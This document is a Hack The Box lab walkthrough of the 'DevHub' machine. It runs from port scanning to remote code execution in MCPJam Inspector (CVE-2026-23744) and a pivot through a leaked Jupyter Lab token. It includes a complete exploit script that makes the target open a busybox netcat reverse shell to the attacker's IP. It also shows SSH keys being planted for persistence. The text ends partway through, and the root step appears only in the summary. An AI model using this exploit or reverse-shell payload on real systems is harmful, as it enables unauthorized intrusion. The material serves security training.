---
Category: HTB/Machines/Linux
tags:
  - HTB
  - Machine
  - Linux
  - Medium
  - MCPJam
  - CVE-2026-23744
  - JupyterServer
  - TokenExpose
  - ModelContextProtocol
  - MCP
  - API
---

![](images/DevHub.png)

## Table of Contents

- [Summary](#Summary)
- [Reconnaissance](#Reconnaissance)
    - [Port Scanning](#Port-Scanning)
    - [Enumeration of Port 80/TCP](#Enumeration-of-Port-80TCP)
    - [Enumeration of Port 6274/TCP](#Enumeration-of-Port-6274TCP)
- [Initial Access](#Initial-Access)
    - [CVE-2026-23744: MCPJam Inspector Remote Code Execution (RCE)](#CVE-2026-23744-MCPJam-Inspector-Remote-Code-Execution-RCE)
- [Enumeration (mcp-dev)](#Enumeration-mcp-dev)
- [Privilege Escalation to analyst](#Privilege-Escalation-to-analyst)
    - [Jupyter Server Token Expose](#Jupyter-Server-Token-Expose)
- [user.txt](#usertxt)
- [Enumeration (analyst)](#Enumeration-analyst)
- [Privilege Escalation to root](#Privilege-Escalation-to-root)
    - [Hidden MCP Tool Abuse via Privileged Internal API](#Hidden-MCP-Tool-Abuse-via-Privileged-Internal-API)
- [root.txt](#roottxt)

## Summary

The box exposes three services: `SSH` on port `22/TCP`, `Nginx` on port `80/TCP` redirecting to `devhub.htb`, and an `MCPJam Inspector` instance on port `6274/TCP`. The `MCPJam Inspector` is running at version `1.4.2`, which is vulnerable to `CVE-2026-23744`.

`CVE-2026-23744` is a `Remote Code Execution` (`RCE`) vulnerability in `MCPJam Inspector` that exploits the `/api/mcp/connect` endpoint. The `MCPJam Inspector` allows connecting to `Model Context Protocol` (`MCP`) servers by specifying a server configuration — including the command to spawn and its arguments. The endpoint does not validate or restrict the supplied command, allowing an attacker to provide an arbitrary binary such as `busybox nc` with a reverse shell payload. This lands a shell as the `mcp-dev` service account.

Enumeration as `mcp-dev` reveals two internally-bound services: port `5000/TCP` (a `Flask`-based `OPSMCP` internal `API`) and port `8888/TCP` (`Jupyter Lab`). `pspy64` is used to monitor running processes, which reveals the `Jupyter Lab` process command line including a plaintext `--ServerApp.token` argument. The token is used to authenticate to the `Jupyter Lab` instance after forwarding port `8888/TCP` over `SSH`, where a terminal is opened as `analyst` to plant an `SSH` public key and retrieve `user.txt`.

Enumeration as `analyst` reveals a hidden file `.opsmcp_key` containing an `API` key for the `OPSMCP` internal service. Reviewing `/opt/opsmcp/server.py` shows the service exposes both visible and hidden tools at `/tools/call` — the hidden `ops._admin_dump` tool is not listed by `/tools/list` but is callable with the correct `API` key. Invoking it with `target=ssh_keys` and `confirm=true` reads `/root/.ssh/id_rsa` and returns the `root` private key in the response. The key is saved locally and used to authenticate over `SSH` as `root`, retrieving `root.txt`.

## Reconnaissance

### Port Scanning

The initial `Nmap` scan revealed two open ports: `22/TCP` (`SSH`) and `80/TCP` (`HTTP`). The full port scan additionally discovered port `6274/TCP`, whose response headers and `HTML` title identified it as an `MCPJam Inspector` instance.

```shell
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV 10.129.9.81
[sudo] password for kali: 
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-30 21:08 +0200
Nmap scan report for 10.129.9.81
Host is up (0.014s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:78:2e:79:0d:87:13:05:2f:53:8e:e7:3c:55:b6:4c (ECDSA)
|_  256 dd:56:8e:bc:da:b8:38:3e:9a:cd:0b:74:ee:53:85:f8 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devhub.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.06 seconds
```

```shell
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -p- 10.129.9.81
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-30 21:09 +0200
Nmap scan report for 10.129.9.81
Host is up (0.018s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:78:2e:79:0d:87:13:05:2f:53:8e:e7:3c:55:b6:4c (ECDSA)
|_  256 dd:56:8e:bc:da:b8:38:3e:9a:cd:0b:74:ee:53:85:f8 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devhub.htb/
6274/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 200 OK
|     access-control-allow-credentials: true
|     content-length: 466
|     content-type: text/html; charset=utf-8
|     vary: Origin
|     Date: Sat, 30 May 2026 19:11:40 GMT
|     Connection: close
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8" />
|     <link rel="icon" type="image/svg+xml" href="/mcp_jam.svg" />
|     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
|     <title>MCPJam Inspector</title>
|     <script type="module" crossorigin src="/assets/index-DRYhT9Xb.js"></script>
|     <link rel="stylesheet" crossorigin href="/assets/index-XvFRNbCs.css">
|     </head>
|     <body>
|     <div id="root"></div>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 204 No Content
|     access-control-allow-credentials: true
|     access-control-allow-methods: GET,HEAD,PUT,POST,DELETE,PATCH
|     vary: Origin
|     content-type: text/plain; charset=UTF-8
|     Date: Sat, 30 May 2026 19:11:40 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 204 No Content
|     access-control-allow-credentials: true
|     access-control-allow-methods: GET,HEAD,PUT,POST,DELETE,PATCH
|     vary: Origin
|     content-type: text/plain; charset=UTF-8
|     Date: Sat, 30 May 2026 19:11:41 GMT
|_    Connection: close
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port6274-TCP:V=7.98%I=7%D=5/30%Time=6A1B366B%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,290,"HTTP/1\.1\x20200\x20OK\r\naccess-control-allow-credential
SF:s:\x20true\r\ncontent-length:\x20466\r\ncontent-type:\x20text/html;\x20
SF:charset=utf-8\r\nvary:\x20Origin\r\nDate:\x20Sat,\x2030\x20May\x202026\
SF:x2019:11:40\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x20html>\n<
SF:html\x20lang=\"en\">\n\x20\x20<head>\n\x20\x20\x20\x20<meta\x20charset=
SF:\"UTF-8\"\x20/>\n\x20\x20\x20\x20<link\x20rel=\"icon\"\x20type=\"image/
SF:svg\+xml\"\x20href=\"/mcp_jam\.svg\"\x20/>\n\x20\x20\x20\x20<meta\x20na
SF:me=\"viewport\"\x20content=\"width=device-width,\x20initial-scale=1\.0\
SF:"\x20/>\n\x20\x20\x20\x20<title>MCPJam\x20Inspector</title>\n\x20\x20\x
SF:20\x20<script\x20type=\"module\"\x20crossorigin\x20src=\"/assets/index-
SF:DRYhT9Xb\.js\"></script>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x
SF:20crossorigin\x20href=\"/assets/index-XvFRNbCs\.css\">\n\x20\x20</head>
SF:\n\x20\x20<body>\n\x20\x20\x20\x20<div\x20id=\"root\"></div>\n\x20\x20<
SF:/body>\n</html>\n")%r(HTTPOptions,F0,"HTTP/1\.1\x20204\x20No\x20Content
SF:\r\naccess-control-allow-credentials:\x20true\r\naccess-control-allow-m
SF:ethods:\x20GET,HEAD,PUT,POST,DELETE,PATCH\r\nvary:\x20Origin\r\ncontent
SF:-type:\x20text/plain;\x20charset=UTF-8\r\nDate:\x20Sat,\x2030\x20May\x2
SF:02026\x2019:11:40\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(RTSPReques
SF:t,F0,"HTTP/1\.1\x20204\x20No\x20Content\r\naccess-control-allow-credent
SF:ials:\x20true\r\naccess-control-allow-methods:\x20GET,HEAD,PUT,POST,DEL
SF:ETE,PATCH\r\nvary:\x20Origin\r\ncontent-type:\x20text/plain;\x20charset
SF:=UTF-8\r\nDate:\x20Sat,\x2030\x20May\x202026\x2019:11:41\x20GMT\r\nConn
SF:ection:\x20close\r\n\r\n")%r(RPCCheck,2F,"HTTP/1\.1\x20400\x20Bad\x20Re
SF:quest\r\nConnection:\x20close\r\n\r\n")%r(DNSVersionBindReqTCP,2F,"HTTP
SF:/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n")%r(DNSS
SF:tatusRequestTCP,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConnection:\x
SF:20close\r\n\r\n")%r(Help,2F,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nConn
SF:ection:\x20close\r\n\r\n")%r(SSLSessionReq,2F,"HTTP/1\.1\x20400\x20Bad\
SF:x20Request\r\nConnection:\x20close\r\n\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 128.07 seconds
```

We added `devhub.htb` to our `/etc/hosts` file.

```shell
┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.9.81     devhub.htb
```

### Enumeration of Port 80/TCP

Using `WhatWeb` identified a site titled `DevHub - Internal Development Platform` running on `nginx 1.18.0`.

- [http://devhub.htb/](http://devhub.htb/)

```shell
┌──(kali㉿kali)-[~]
└─$ whatweb http://devhub.htb/
http://devhub.htb/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.9.81], Title[DevHub - Internal Development Platform], nginx[1.18.0]
```

![](images/2026-05-30_21-11_80_website.png)

### Enumeration of Port 6274/TCP

Next we found an `MCPJam Inspector` application on port `6274/TCP` which directly granted us access to the dashboard.

- [http://devhub.htb:6274/](http://devhub.htb:6274/)

```shell
┌──(kali㉿kali)-[~]
└─$ whatweb http://devhub.htb:6274/
http://devhub.htb:6274/ [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.129.9.81], Script[module], Title[MCPJam Inspector], UncommonHeaders[access-control-allow-credentials]
```

![](images/2026-05-30_21-12_6274_mcpjam_inspector_dashboard.png)

The `MCPJam Inspector` version was identified as `1.4.2`, which is vulnerable to `CVE-2026-23744`.

![](images/2026-05-30_21-13_6274_mcpjam_inspector_version.png)

| Version |
| ------- |
| 1.4.2   |

## Initial Access

### CVE-2026-23744: MCPJam Inspector Remote Code Execution (RCE)

`CVE-2026-23744` is a `Remote Code Execution` (`RCE`) vulnerability in `MCPJam Inspector` versions prior to `1.4.3`. The `MCPJam Inspector` is a web-based debugging tool for `Model Context Protocol` (`MCP`) servers that allows users to connect to and inspect `MCP` server instances. The vulnerability exists in the `/api/mcp/connect` endpoint, which accepts a `serverConfig` object specifying the command and arguments used to spawn the `MCP` server process. The endpoint performs no validation or allowlisting of the supplied command, meaning an attacker can provide any arbitrary binary — in this case `busybox nc` with the `-e /bin/bash` flag — to establish a reverse shell in the context of the process running the `MCPJam Inspector` service.

- [https://github.com/suljov/CVE-2026-23744-Remote-Code-Execution-POC](https://github.com/suljov/CVE-2026-23744-Remote-Code-Execution-POC)

The original `PoC` was modified by us to match the boxes address and port.

```shell
┌──(kali㉿kali)-[/mnt/…/Machines/DevHub/files/CVE-2026-23744-Remote-Code-Execution-POC]
└─$ cat exploit.py 
import requests
import json


target = "https://TARGET"
ip = "ATTACKER_IP"
port = "ATTACKER_PORT"

url = f'{target}/api/mcp/connect'


data = {
    "serverConfig": {
        "command": "busybox",
        "args": [
            "nc",
            f"{ip}",
            f"{port}",
            "-e",
            "/bin/bash"
        ],
        "env": {}
    },
    "serverId": "213j1l3jkljkl3j"
}

response = requests.post(url, json=data, verify=False)

print(response.status_code)
print(response.text)
```

```shell
import requests
import json


target = "http://devhub.htb:6274/"
ip = "10.10.16.63"
port = "9001"

url = f'{target}/api/mcp/connect'


data = {
    "serverConfig": {
        "command": "busybox",
        "args": [
            "nc",
            f"{ip}",
            f"{port}",
            "-e",
            "/bin/bash"
        ],
        "env": {}
    },
    "serverId": "213j1l3jkljkl3j"
}

response = requests.post(url, json=data, verify=False)

print(response.status_code)
print(response.text)

```

```shell
┌──(kali㉿kali)-[/mnt/…/Machines/DevHub/files/CVE-2026-23744-Remote-Code-Execution-POC]
└─$ python3 exploit.py
```

The reverse shell connected back as the `mcp-dev` service account.

```shell
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.16.63] from (UNKNOWN) [10.129.9.81] 37100
```

Then we upgraded the shell to a full interactive `TTY` using `Python`'s `pty` module.

```shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ ^Z
zsh: suspended  nc -lnvp 9001
                                                                                                                                                                                                                                                                                                                                                                                                                                          
┌──(kali㉿kali)-[~]
└─$ stty raw -echo;fg
[1]  + continued  nc -lnvp 9001

mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ 
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ export XTERM=xterm
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$
```

## Enumeration (mcp-dev)

Confirming identity showed `mcp-dev` running as `uid=1001` with no supplementary group memberships. Reviewing `/etc/passwd` identified `analyst` (uid `1002`) as the only other human account with a login shell.

```shell
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ id
uid=1001(mcp-dev) gid=1001(mcp-dev) groups=1001(mcp-dev)
```

```shell
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
syslog:x:106:113::/home/syslog:/usr/sbin/nologin
uuidd:x:107:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin
tss:x:109:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:110:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:111:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
mcp-dev:x:1001:1001::/home/mcp-dev:/bin/bash
analyst:x:1002:1002::/home/analyst:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
```

The environment variables showed a minimal context with no credentials or sensitive tokens present. `ss -tulpn` revealed two internally-bound services not accessible externally: port `5000/TCP` and port `8888/TCP`.

```shell
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ env
SHELL=/bin/bash
PWD=/opt/mcpjam/node_modules/@mcpjam/inspector
LOGNAME=mcp-dev
HOME=/home/mcp-dev
LS_COLORS=
LESSCLOSE=/usr/bin/lesspipe %s %s
LESSOPEN=| /usr/bin/lesspipe %s
USER=mcp-dev
SHLVL=2
LC_CTYPE=C.UTF-8
XTERM=xterm
PATH=/opt/mcpjam/node_modules/.bin:/opt/node_modules/.bin:/node_modules/.bin:/usr/lib/node_modules/npm/node_modules/@npmcli/run-script/lib/node-gyp-bin:/opt/mcpjam/node_modules/.bin:/opt/node_modules/.bin:/node_modules/.bin:/usr/lib/node_modules/npm/node_modules/@npmcli/run-script/lib/node-gyp-bin:/usr/local/bin:/usr/bin:/bin:/snap/bin
_=/usr/bin/env
```

```shell
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$ ss -tulpn
Netid State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess                                    
udp   UNCONN 0      0      127.0.0.53%lo:53        0.0.0.0:*                                              
udp   UNCONN 0      0            0.0.0.0:68        0.0.0.0:*                                              
tcp   LISTEN 0      128        127.0.0.1:5000      0.0.0.0:*                                              
tcp   LISTEN 0      128        127.0.0.1:8888      0.0.0.0:*                                              
tcp   LISTEN 0      4096   127.0.0.53%lo:53        0.0.0.0:*                                              
tcp   LISTEN 0      511          0.0.0.0:80        0.0.0.0:*                                              
tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*                                              
tcp   LISTEN 0      511          0.0.0.0:6274      0.0.0.0:*    users:(("node-MainThread",pid=1278,fd=29))
tcp   LISTEN 0      128             [::]:22           [::]:*
```

## Privilege Escalation to analyst

### Jupyter Server Token Expose

Port `8888/TCP` is the default port for `Jupyter Lab` and `Jupyter Notebook`. To access it from our local machine, we planted an `SSH` public key in `mcp-dev`'s `authorized_keys` to establish a stable `SSH` session for port forwarding.

```shell
mcp-dev@devhub:~$ mkdir .ssh
mcp-dev@devhub:~$ cd .ssh
mcp-dev@devhub:~/.ssh$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB8r4vPbn2m6ycgd7n22IPKG9aN7kviP37uw03woICNN" > authorized_keys
```

Then we forwarded port `8888/TCP` to access it from within the browser.

```shell
┌──(kali㉿kali)-[~]
└─$ ssh -L 8888:localhost:8888  mcp-dev@devhub.htb
The authenticity of host 'devhub.htb (10.129.9.81)' can't be established.
ED25519 key fingerprint is: SHA256:K64LcxfMoWF9TY77Q+quN1nvBzFftQ11ZxoH8eULpCs
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'devhub.htb' (ED25519) to the list of known hosts.
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-179-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat May 30 07:28:49 PM UTC 2026

  System load:           0.16
  Usage of /:            76.4% of 9.50GB
  Memory usage:          14%
  Swap usage:            0%
  Processes:             224
  Users logged in:       0
  IPv4 address for eth0: 10.129.9.81
  IPv6 address for eth0: dead:beef::a0de:adff:fed0:303a

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


Last login: Sat May 30 19:28:50 2026 from 10.10.16.63
mcp-dev@devhub:~$
```

With the tunnel active, the `Jupyter Lab` login page was accessible but required a token.

- [http://127.0.0.1:8888/login?next=%2Flab%3F](http://127.0.0.1:8888/login?next=%2Flab%3F)

![](images/2026-05-30_21-29_8888_jupyter_server.png)

Since the page require a `token` to login, we uploaded `PSPY` and used it to monitor the in the background running processes. `Jupyter Lab` passed its authentication token as a plaintext command-line argument (`--ServerApp.token`), which was visible to all users via `/proc` and therefore captured by `pspy64`. The full command line of the `Jupyter Lab` process running as `analyst` (uid `1002`) revealed the token.

- [https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)

```shell
┌──(kali㉿kali)-[/mnt/…/HTB/Machines/DevHub/serve]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```shell
mcp-dev@devhub:/tmp$ wget http://10.10.16.63/pspy64
--2026-05-30 19:31:32--  http://10.10.16.63/pspy64
Connecting to 10.10.16.63:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                                                                                                     100%[======================================================================================================================================================================================================================================================================================>]   2.96M  5.12MB/s    in 0.6s    

2026-05-30 19:31:33 (5.12 MB/s) - ‘pspy64’ saved [3104768/3104768]
```

```shell
mcp-dev@devhub:/tmp$ chmod +x pspy64
```

```shell
mcp-dev@devhub:/tmp$ ./pspy64 
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2026/05/30 19:31:56 CMD: UID=1001  PID=1598   | ./pspy64 
2026/05/30 19:31:56 CMD: UID=1001  PID=1574   | -bash 
2026/05/30 19:31:56 CMD: UID=1001  PID=1573   | sshd: mcp-dev@pts/1  
2026/05/30 19:31:56 CMD: UID=1001  PID=1472   | (sd-pam) 
2026/05/30 19:31:56 CMD: UID=1001  PID=1471   | /lib/systemd/systemd --user 
2026/05/30 19:31:56 CMD: UID=0     PID=1468   | sshd: mcp-dev [priv] 
2026/05/30 19:31:56 CMD: UID=0     PID=1445   | 
2026/05/30 19:31:56 CMD: UID=1001  PID=1431   | /bin/bash 
2026/05/30 19:31:56 CMD: UID=1001  PID=1430   | python3 -c import pty;pty.spawn("/bin/bash") 
2026/05/30 19:31:56 CMD: UID=0     PID=1421   | 
2026/05/30 19:31:56 CMD: UID=0     PID=1420   | 
2026/05/30 19:31:56 CMD: UID=1001  PID=1278   | node /opt/mcpjam/node_modules/@mcpjam/inspector/dist/server/index.js 
2026/05/30 19:31:56 CMD: UID=1001  PID=1270   | node /opt/mcpjam/node_modules/.bin/inspector 
2026/05/30 19:31:56 CMD: UID=1001  PID=1269   | sh -c "inspector" 
2026/05/30 19:31:56 CMD: UID=1001  PID=1241   | npm exec @mcpjam/inspector@1.4.2          
2026/05/30 19:31:56 CMD: UID=1001  PID=1240   | sh -c npx @mcpjam/inspector@1.4.2 
2026/05/30 19:31:56 CMD: UID=33    PID=1158   | nginx: worker process                            
2026/05/30 19:31:56 CMD: UID=33    PID=1157   | nginx: worker process                            
2026/05/30 19:31:56 CMD: UID=0     PID=1156   | nginx: master process /usr/sbin/nginx -g daemon on; master_process on; 
2026/05/30 19:31:56 CMD: UID=0     PID=1051   | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups 
2026/05/30 19:31:56 CMD: UID=0     PID=1038   | /sbin/agetty -o -p -- \u --noclear tty1 linux 
2026/05/30 19:31:56 CMD: UID=0     PID=1024   | /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py 
2026/05/30 19:31:56 CMD: UID=0     PID=1023   | /usr/sbin/cron -f -P 
2026/05/30 19:31:56 CMD: UID=1001  PID=1019   | npm start               
2026/05/30 19:31:56 CMD: UID=1002  PID=1018   | /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 --ServerApp.password= --ServerApp.allow_origin= --ServerApp.disable_check_xsrf=False 
2026/05/30 19:31:56 CMD: UID=0     PID=932    | /usr/sbin/ModemManager 
2026/05/30 19:31:56 CMD: UID=0     PID=899    | /usr/libexec/udisks2/udisksd 
2026/05/30 19:31:56 CMD: UID=0     PID=898    | /lib/systemd/systemd-logind 
2026/05/30 19:31:56 CMD: UID=0     PID=897    | /usr/lib/snapd/snapd 
2026/05/30 19:31:56 CMD: UID=106   PID=895    | /usr/sbin/rsyslogd -n -iNONE 
2026/05/30 19:31:56 CMD: UID=0     PID=894    | /usr/libexec/polkitd --no-debug 
2026/05/30 19:31:56 CMD: UID=0     PID=893    | /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers 
2026/05/30 19:31:56 CMD: UID=0     PID=892    | /usr/sbin/irqbalance --foreground 
2026/05/30 19:31:56 CMD: UID=103   PID=887    | @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only 
2026/05/30 19:31:56 CMD: UID=0     PID=846    | /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0 
2026/05/30 19:31:56 CMD: UID=0     PID=813    | /usr/bin/vmtoolsd 
2026/05/30 19:31:56 CMD: UID=0     PID=812    | /usr/bin/VGAuthService 
2026/05/30 19:31:56 CMD: UID=0     PID=788    | 
2026/05/30 19:31:56 CMD: UID=998   PID=763    | /usr/local/sbin/laurel --config /etc/laurel/config.toml 
2026/05/30 19:31:56 CMD: UID=0     PID=761    | /sbin/auditd 
2026/05/30 19:31:56 CMD: UID=104   PID=758    | /lib/systemd/systemd-timesyncd 
2026/05/30 19:31:56 CMD: UID=102   PID=757    | /lib/systemd/systemd-resolved
```

| Token                                    |
| ---------------------------------------- |
| a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 |

And with the token we were able to authenticate to the forwarded `Jupyter Lab` instance, gaining access to the `analyst` environment by opening a `Terminal`.

![](images/2026-05-30_21-33_8888_jupyter_server_dashboard.png)

![](images/2026-05-30_21-35_8888_jupyter_server_terminal.png)

```shell
analyst@devhub:~$ ls -la
total 56
drwxr-x--- 9 analyst analyst 4096 May 27 12:22 .
drwxr-xr-x 4 root    root    4096 Mar 16 21:25 ..
-rw------- 1 analyst analyst    0 May 27 12:22 .bash_history
-rw-r--r-- 1 analyst analyst  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 analyst analyst 3771 Jan  6  2022 .bashrc
drwx------ 2 analyst analyst 4096 Jan 22 16:05 .cache
drwxr-xr-x 3 analyst analyst 4096 May 26 08:42 .ipython
drwxr-xr-x 3 analyst analyst 4096 May 30 19:33 .jupyter
drwxr-xr-x 7 analyst analyst 4096 Jan 22 15:06 jupyter-env
lrwxrwxrwx 1 root    root       9 Jan 23 15:37 .lesshst -> /dev/null
drwxr-xr-x 3 analyst analyst 4096 Jan 22 15:08 .local
lrwxrwxrwx 1 root    root       9 Jan 23 15:37 .node_repl_history -> /dev/null
drwxr-xr-x 3 analyst analyst 4096 May 26 08:42 notebooks
drwxr-xr-x 3 analyst analyst 4096 Jan 22 15:08 .npm
-rw------- 1 analyst analyst   35 Mar 16 21:49 .opsmcp_key
-rw-r--r-- 1 analyst analyst  807 Jan  6  2022 .profile
lrwxrwxrwx 1 root    root       9 Jan 23 15:37 .python_history -> /dev/null
-rw-r----- 1 root    analyst   33 May 30 19:07 user.txt
lrwxrwxrwx 1 root    root       9 Jan 23 15:37 .viminfo -> /dev/null
```

We added our `SSH` key to have easy access to the user analyst.

```shell
analyst@devhub:~$ mkdir .ssh
analyst@devhub:~$ cd .ssh
analyst@devhub:~/.ssh$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB8r4vPbn2m6ycgd7n22IPKG9aN7kviP37uw03woICNN" > authorized_keys
```

![](images/2026-05-30_21-36_8888_jupyter_server_ssh_key_analyst.png)

```shell
┌──(kali㉿kali)-[~]
└─$ ssh analyst@devhub.htb
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-179-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sat May 30 07:37:00 PM UTC 2026

  System load:           0.07
